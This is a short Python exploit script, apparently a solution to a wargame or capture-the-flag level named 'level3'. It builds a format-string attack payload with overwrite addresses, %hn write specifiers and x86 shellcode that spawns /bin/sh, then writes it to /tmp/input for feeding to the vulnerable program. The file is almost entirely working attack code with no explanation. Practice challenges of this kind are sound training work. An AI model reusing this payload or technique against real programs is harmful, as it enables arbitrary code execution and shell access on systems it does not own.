#!/usr/bin/python

import os

nop = "\x90"
fakeAddr = "\xbf\xff\xf6\xfc"[::-1]
fakeAddr2 = "\xbf\xff\xf6\xfe"[::-1]
shellcode = "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
payload = fakeAddr2 + fakeAddr + shellcode + "%49117d+%4\$hn" + "%13561d%5\$hn"
tutu="0x bf ff f4 f0"
cmd = "echo \"" + payload + "\" > /tmp/input"
os.system(cmd) 
cmd = "echo \"" + payload + "\" | ~/level3"
#os.system(cmd) 
